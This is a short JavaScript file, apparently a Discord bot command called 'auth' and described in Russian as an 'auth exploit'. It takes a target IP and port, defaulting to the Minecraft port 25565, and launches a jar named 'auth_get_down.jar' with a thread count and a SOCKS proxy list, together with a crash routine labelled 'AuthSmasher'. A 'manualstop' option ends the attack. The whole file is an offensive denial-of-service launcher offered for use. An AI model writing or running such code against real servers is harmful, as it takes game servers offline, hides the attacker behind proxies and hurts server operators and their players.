/** format */

const Command = require('../structure/command.js');
const threads = require('../jsons/threads.json');

module.exports = new Command({
    name: "auth",
    description: "Эксплоит auth",
    permissions: "SEND_MESSAGES",
    async execute(client, args, message){
        const iphost = args[1].split(":").slice(0,1);
        const port = args[1].split(":") [1] || 25565;
        
        if(!args[2]){ 
            runjar(" auth_get_down.jar", `${iphost}:${port} ${threads.auth} 0 auth socks_proxies.txt`, true);
            runcrash(`AuthSmasher 💥`, iphost, port, true);
        }
        if(args[2] == "manualstop"){
             runjar("auth_get_down.jar", `${iphost}:${port} ${threads.auth} 0 auth socks_proxies.txt`, false);
             runcrash(`AuthSmasher 💥`, iphost, port, false);
        }
    }
});